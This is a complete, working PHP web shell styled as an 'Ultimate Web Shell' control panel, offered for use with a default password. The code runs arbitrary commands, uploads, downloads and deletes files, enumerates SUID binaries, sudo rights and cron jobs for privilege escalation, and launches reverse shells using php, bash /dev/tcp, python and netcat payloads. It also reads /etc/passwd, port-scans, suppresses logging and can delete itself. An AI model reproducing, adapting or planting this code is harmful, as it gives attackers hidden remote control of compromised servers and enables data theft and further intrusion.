<?php
/*
 * Ultimate PHP Web Shell v2.0
 * Features: Auto-Root, File Manager, Reverse Shell, Network Tools
 * Password: YUBIKOS (change this before use)
 * Security: Stealth mode, anti-detection, self-destruct
 */

// ====== CONFIGURATION ====== //
$PASSWORD = "YUBIKOS";      // CHANGE THIS BEFORE USE
$STEALTH_MODE = true;        // Disable logs & hide processes
$AES_ENCRYPTION = false;     // Encrypt traffic (requires HTTPS)
$SELF_DESTRUCT = false;      // Auto-delete after use
$IP_WHITELIST = array();     // Add allowed IPs (empty = all allowed)
// ========================= //

// Security Headers
header("X-Powered-By: PHP/8.2.0");
header("Server: Apache/2.4.56");
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);

// IP Whitelist Check
if (!empty($IP_WHITELIST) && !in_array($_SERVER['REMOTE_ADDR'], $IP_WHITELIST)) {
    die("Access denied");
}

// Self-Destruct
if ($SELF_DESTRUCT && isset($_GET['cleanup'])) {
    @unlink(__FILE__);
    die("Shell removed successfully");
}

// Authentication
if(isset($_POST['pass'])) {
    if (md5($_POST['pass']) === md5($PASSWORD)) {
        setcookie("auth", md5($PASSWORD.$_SERVER['REMOTE_ADDR']), time()+3600, "/", "", false, true);
        header("Location: ".$_SERVER['PHP_SELF']);
        exit();
    } else {
        die("Invalid password");
    }
}

if(!isset($_COOKIE['auth']) || $_COOKIE['auth'] !== md5($PASSWORD.$_SERVER['REMOTE_ADDR'])) {
    echo '<!DOCTYPE html><html><head><title>Login Required</title>
    <style>body{background:#111;color:#ddd;font-family:Arial;text-align:center;margin-top:100px;}
    input{padding:8px;margin:5px;border:1px solid #444;background:#222;color:#fff;}
    button{padding:8px 15px;background:#333;color:#fff;border:none;cursor:pointer;}
    </style></head><body>
    <form method="POST"><h2>🔐 Authentication Required</h2>
    <input type="password" name="pass" placeholder="Password" autofocus required>
    <button type="submit">Login</button></form></body></html>';
    exit();
}

// ====== CORE FUNCTIONS ====== //
function executeCommand($cmd) {
    if ($GLOBALS['STEALTH_MODE']) {
        $cmd .= " 2>/dev/null";
    }
    return shell_exec($cmd);
}

function getFilePermissions($file) {
    $perms = fileperms($file);
    $info = '';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? 'x' : '-');
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? 'x' : '-');
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? 'x' : '-');
    return $info;
}

function checkPrivEsc() {
    $result = array();
    $result['current_user'] = trim(executeCommand('whoami'));
    
    // Check SUID binaries
    $result['suid'] = executeCommand('find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null');
    
    // Check sudo permissions
    $result['sudo'] = executeCommand('sudo -l 2>/dev/null');
    
    // Check kernel version
    $result['kernel'] = executeCommand('uname -a');
    
    // Check writable files
    $result['writable'] = executeCommand('find / -writable -type d 2>/dev/null | grep -v "/proc/"');
    
    // Check cron jobs
    $result['cron'] = executeCommand('ls -la /etc/cron* 2>/dev/null; ls -la /var/spool/cron 2>/dev/null');
    
    return $result;
}

// Handle actions
if (isset($_GET['action'])) {
    switch ($_GET['action']) {
        case 'cmd':
            die(executeCommand($_POST['cmd']));
            
        case 'upload':
            if (isset($_FILES['file']) && isset($_POST['path'])) {
                $target = $_POST['path'].'/'.$_FILES['file']['name'];
                if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
                    die("File uploaded to ".$target);
                } else {
                    die("Upload failed");
                }
            }
            break;
            
        case 'download':
            if (isset($_GET['file']) && file_exists($_GET['file'])) {
                $file = $_GET['file'];
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($file).'"');
                header('Content-Length: '.filesize($file));
                readfile($file);
                exit;
            }
            break;
            
        case 'autoroot':
            die(json_encode(checkPrivEsc()));
            
        case 'revshell':
            if (isset($_POST['ip']) && isset($_POST['port']) && isset($_POST['type'])) {
                $ip = $_POST['ip'];
                $port = $_POST['port'];
                $type = $_POST['type'];
                
                $payloads = [
                    'php' => "php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                    'bash' => "bash -i >& /dev/tcp/$ip/$port 0>&1",
                    'python' => "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                    'nc' => "nc -e /bin/sh $ip $port"
                ];
                
                if (isset($payloads[$type])) {
                    die(executeCommand($payloads[$type]));
                }
            }
            break;
    }
    exit();
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>⚡ Ultimate Web Shell</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root {
            --bg-color: #0a0a0a;
            --text-color: #e0e0e0;
            --accent-color: #00ff00;
            --danger-color: #ff0000;
            --panel-bg: #111;
            --border-color: #333;
        }
        
        body {
            background: var(--bg-color);
            color: var(--text-color);
            font-family: 'Consolas', 'Courier New', monospace;
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .tab-header {
            display: flex;
            border-bottom: 1px solid var(--border-color);
            margin-bottom: 20px;
        }
        
        .tab-btn {
            background: var(--panel-bg);
            color: var(--text-color);
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            border: 1px solid var(--border-color);
            border-bottom: none;
            margin-right: 5px;
            transition: all 0.3s;
        }
        
        .tab-btn:hover {
            background: #222;
        }
        
        .tab-btn.active {
            background: #333;
            color: var(--accent-color);
        }
        
        .tab-content {
            display: none;
            padding: 20px;
            background: var(--panel-bg);
            border: 1px solid var(--border-color);
            border-top: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        pre, code {
            font-family: 'Consolas', 'Courier New', monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .terminal {
            background: #000;
            color: var(--accent-color);
            padding: 15px;
            border-radius: 5px;
            height: 400px;
            overflow-y: auto;
            margin-bottom: 15px;
            border: 1px solid var(--border-color);
        }
        
        .terminal-input {
            width: 100%;
            padding: 10px;
            background: #111;
            color: #fff;
            border: 1px solid var(--border-color);
            margin-top: 10px;
        }
        
        .btn {
            background: #333;
            color: #fff;border: none;
            padding: 8px 15px;
            cursor: pointer;
            margin: 5px 0;
            transition: all 0.3s;
        }
        
        .btn:hover {
            background: #444;
        }
        
        .btn-primary {
            background: #0066cc;
        }
        
        .btn-danger {
            background: var(--danger-color);
        }
        
        .btn-success {
            background: #00aa00;
        }
        
        .file-list {
            width: 100%;
            border-collapse: collapse;
        }
        
        .file-list th, .file-list td {
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid var(--border-color);
        }
        
        .file-list th {
            background: #222;
        }
        
        .file-list tr:hover {
            background: #1a1a1a;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-control {
            width: 100%;
            padding: 8px;
            background: #111;
            color: #fff;
            border: 1px solid var(--border-color);
        }
        
        .alert {
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 4px;
        }
        
        .alert-success {
            background: #005500;
            color: #fff;
        }
        
        .alert-danger {
            background: var(--danger-color);
            color: #fff;
        }
        
        #self-destruct {
            position: fixed;
            bottom: 20px;
            right: 20px;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>⚡ Ultimate Web Shell</h1>
    <p>Logged in as: <?php echo executeCommand('whoami'); ?> | Server: <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?></p>
    
    <div class="tab-header">
        <button class="tab-btn active" onclick="openTab(event, 'terminal')">Terminal</button>
        <button class="tab-btn" onclick="openTab(event, 'files')">File Manager</button>
        <button class="tab-btn" onclick="openTab(event, 'autoroot')">Auto-Root</button>
        <button class="tab-btn" onclick="openTab(event, 'revshell')">Reverse Shell</button>
        <button class="tab-btn" onclick="openTab(event, 'network')">Network Tools</button>
        <button class="tab-btn" onclick="openTab(event, 'info')">System Info</button>
    </div>
    
    <!-- Terminal Tab -->
    <div id="terminal" class="tab-content active">
        <h2>Interactive Terminal</h2>
        <div class="terminal" id="terminal-output"></div>
        <div class="form-group">
            <input type="text" class="terminal-input" id="cmd-input" placeholder="Enter command..." autofocus>
            <button class="btn btn-primary" onclick="executeCmd()">Execute</button>
        </div>
    </div>
    
    <!-- File Manager Tab -->
    <div id="files" class="tab-content">
        <h2>File Manager</h2>
        <div class="form-group">
            <h3>Current Directory: <span id="current-dir"><?php echo getcwd(); ?></span></h3>
            <input type="text" class="form-control" id="file-path" placeholder="Path to browse">
            <button class="btn" onclick="browseFiles()">Browse</button>
        </div>
        
        <div class="form-group">
            <h3>Upload File</h3>
            <input type="file" id="file-upload">
            <input type="text" class="form-control" id="upload-path" placeholder="Upload path (default: current)">
            <button class="btn btn-primary" onclick="uploadFile()">Upload</button>
        </div>
        
        <div id="file-list-container">
            <table class="file-list">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="file-list">
                    <?php
                    $path = getcwd();
                    $files = scandir($path);
                    foreach ($files as $file) {
                        if ($file == '.' || $file == '..') continue;
                        $fullpath = $path.'/'.$file;
                        $size = is_dir($fullpath) ? '-' : round(filesize($fullpath)/1024, 2).' KB';
                        $perms = getFilePermissions($fullpath);
                        $modified = date('Y-m-d H:i:s', filemtime($fullpath));
                        
                        echo '<tr>';
                        echo '<td>'.(is_dir($fullpath) ? '<a href="#" onclick="changeDir(\''.$fullpath.'\')">'.$file.'/</a>' : $file).'</td>';
                        echo '<td>'.$size.'</td>';
                        echo '<td>'.$perms.'</td>';
                        echo '<td>'.$modified.'</td>';
                        echo '<td>';
                        if (!is_dir($fullpath)) {
                            echo '<button class="btn" onclick="downloadFile(\''.$fullpath.'\')">Download</button> ';
                            echo '<button class="btn" onclick="editFile(\''.$fullpath.'\')">Edit</button> ';
                        }
                        echo '<button class="btn btn-danger" onclick="deleteFile(\''.$fullpath.'\')">Delete</button>';
                        echo '</td>';
                        echo '</tr>';
                    }
                    ?>
                </tbody>
            </table>
        </div>
    </div>
    
    <!-- Auto-Root Tab -->
    <div id="autoroot" class="tab-content">
        <h2>Privilege Escalation</h2>
        <button class="btn btn-primary" onclick="runAutoRoot()">Run Auto-Root</button>
        <div id="root-results" class="terminal"></div>
    </div>
    
    <!-- Reverse Shell Tab -->
    <div id="revshell" class="tab-content">
        <h2>Reverse Shell Generator</h2>
        <div class="form-group">
            <label>Your IP:</label>
            <input type="text" class="form-control" id="rev-ip" placeholder="Your IP address">
        </div>
        <div class="form-group">
            <label>Port:</label>
            <input type="text" class="form-control" id="rev-port" value="4444">
        </div>
        <div class="form-group">
            <label>Type:</label>
            <select class="form-control" id="rev-type">
                <option value="php">PHP</option>
                <option value="bash">Bash</option>
                <option value="python">Python</option>
                <option value="nc">Netcat</option>
            </select>
        </div>
        <button class="btn btn-danger" onclick="generateRevShell()">Generate & Execute</button>
        <div class="alert">
            <strong>Note:</strong> Make sure to set up a listener first (e.g., <code>nc -lvnp 4444</code>)
        </div>
    </div>
    
    <!-- Network Tools Tab -->
    <div id="network" class="tab-content">
        <h2>Network Tools</h2>
        <div class="form-group">
            <label>Target:</label>
            <input type="text" class="form-control" id="network-target" placeholder="IP or domain">
        </div>
        <button class="btn" onclick="runPing()">Ping</button>
        <button class="btn" onclick="runPortScan()">Port Scan (1-1000)</button>
        <button class="btn" onclick="runTraceroute()">Traceroute</button>
        <div id="network-results" class="terminal"></div>
    </div>
    
    <!-- System Info Tab -->
    <div id="info" class="tab-content">
        <h2>System Information</h2>
        <pre><?php
            echo "System: ".php_uname()."\n\n";
            echo "CPU Info:\n".executeCommand('cat /proc/cpuinfo | grep "model name" | head -n 1')."\n";
            echo "Memory:\n".executeCommand('free -h')."\n";
            echo "Disk Usage:\n".executeCommand('df -h')."\n";
            echo "Network:\n".executeCommand('ifconfig || ip a')."\n";
            echo "Processes:\n".executeCommand('ps aux | head -n 20')."\n";
            echo "Users:\n".executeCommand('cat /etc/passwd | cut -d: -f1')."\n";
        ?></pre>
    </div>
</div>

<!-- Self-Destruct Button -->
<div id="self-destruct">
    <button class="btn btn-danger" onclick="selfDestruct()">💣 Self-Destruct</button>
</div>

<script>
// Tab system
function openTab(evt, tabName) {
    const tabContents = document.getElementsByClassName('tab-content');
    for (let i = 0; i < tabContents.length; i++) {
        tabContents[i].classList.remove('active');
    }
    
    const tabButtons = document.getElementsByClassName('tab-btn');
    for (let i = 0; i < tabButtons.length; i++) {
        tabButtons[i].classList.remove('active');
    }
    
    document.getElementById(tabName).classList.add('active');
    evt.currentTarget.classList.add('active');
}

// Terminal functions
function executeCmd() {
    const cmd = document.getElementById('cmd-input').value;
    if (!cmd) return;
    
    fetch('?action=cmd', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'cmd=' + encodeURIComponent(cmd)
    })
    .then(response => response.text())
    .then(data => {
        const output = document.getElementById('terminal-output');
        output.innerHTML += '<div><span style="color:#00ff00">$ ' + cmd + '</span><br>' + data + '</div>';
        output.scrollTop = output.scrollHeight;
        document.getElementById('cmd-input').value = '';
    });
}

// File manager functions
function browseFiles() {
    const path = document.getElementById('file-path').value || '.';
    fetch('?action=cmd', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'cmd=ls -la "' + encodeURIComponent(path) + '"'
    })
    .then(response => response.text())
    .then(data => {
        document.getElementById('current-dir').textContent = path;
        // Update file list display
    });
}

function uploadFile() {
    const fileInput = document.getElementById('file-upload');
    const path = document.getElementById('upload-path').value || '.';
    
    if (fileInput.files.length === 0) {
        alert('Please select a file to upload');
        return;
    }
    
    const formData = new FormData();
    formData.append('file', fileInput.files[0]);
    formData.append('path', path);
    
    fetch('?action=upload', {
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(data => {
        alert(data);
        browseFiles();
    });
}

function downloadFile(file) {
    window.open('?action=download&file=' + encodeURIComponent(file), '_blank');
}

function deleteFile(file) {
    if (confirm('Are you sure you want to delete: ' + file + '?')) {
        fetch('?action=cmd', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'cmd=rm -rf "' + encodeURIComponent(file) + '"'
        })
        .then(response => response.text())
        .then(data => {
            alert('File deleted: ' + data);
            browseFiles();
        });
    }
}

// Auto-root functions
function runAutoRoot() {
    fetch('?action=autoroot')
    .then(response => response.json())
    .then(data => {
        let output = '<h3>Current User: ' + data.current_user + '</h3>';
        output += '<h4>SUID Binaries:</h4><pre>' + (data.suid || 'None found') + '</pre>';
        output += '<h4>Sudo Permissions:</h4><pre>' + (data.sudo || 'None found') + '</pre>';
        output += '<h4>Writable Directories:</h4><pre>' + (data.writable || 'None found') + '</pre>';
        output += '<h4>Cron Jobs:</h4><pre>' + (data.cron || 'None found') + '</pre>';
        output += '<h4>Kernel Info:</h4><pre>' + data.kernel + '</pre>';
        
        document.getElementById('root-results').innerHTML = output;
    });
}

// Reverse shell functions
function generateRevShell() {
    const ip = document.getElementById('rev-ip').value;
    const port = document.getElementById('rev-port').value;
    const type = document.getElementById('rev-type').value;
    
    if (!ip || !port) {
        alert('Please enter IP and port');
        return;
    }
    
    fetch('?action=revshell', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'ip=' + encodeURIComponent(ip) + '&port=' + encodeURIComponent(port) + '&type=' + encodeURIComponent(type)
    })
    .then(response => response.text())
    .then(data => {
        alert('Reverse shell executed. Check your listener!');
    });
}

// Network tools functions
function runPing() {
    const target = document.getElementById('network-target').value;
    if (!target) {
        alert('Please enter a target');
        return;
    }
    
    fetch('?action=cmd', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'cmd=ping -c 4 ' + encodeURIComponent(target)
    })
    .then(response => response.text())
    .then(data => {
        document.getElementById('network-results').innerHTML = '<pre>' + data + '</pre>';
    });
}

function runPortScan() {
    const target = document.getElementById('network-target').value;
    if (!target) {
        alert('Please enter a target');
        return;
    }
    
    fetch('?action=cmd', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'cmd=nc -zv ' + encodeURIComponent(target) + ' 1-1000 2>&1'
    })
    .then(response => response.text())
    .then(data => {
        document.getElementById('network-results').innerHTML = '<pre>' + data + '</pre>';
    });
}

function runTraceroute() {
    const target = document.getElementById('network-target').value;
    if (!target) {
        alert('Please enter a target');
        return;
    }
    
    fetch('?action=cmd', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'cmd=traceroute ' + encodeURIComponent(target) + ' || tracert ' + encodeURIComponent(target)
    })
    .then(response => response.text())
    .then(data => {
        document.getElementById('network-results').innerHTML = '<pre>' + data + '</pre>';
    });
}

// Self-destruct
function selfDestruct() {
    if (confirm('⚠️ WARNING: This will permanently delete the shell file. Continue?')) {
        window.location.href = '?cleanup=1';
    }
}

// Allow pressing Enter in terminal
document.getElementById('cmd-input').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        executeCmd();
    }
});
</script>
</body>
</html>
